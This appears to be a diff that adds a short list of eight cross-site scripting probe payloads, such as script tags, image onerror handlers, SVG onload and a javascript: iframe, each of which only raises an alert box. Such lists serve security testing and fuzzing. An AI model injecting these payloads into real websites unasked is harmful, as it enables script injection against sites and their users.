@@ -1,0 +1,8 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><script>alert('XSS')</script>
+'-alert('XSS')-'
+<body onload=alert('XSS')>
+<iframe src="javascript:alert(1)">
+<details open ontoggle=alert(1)>
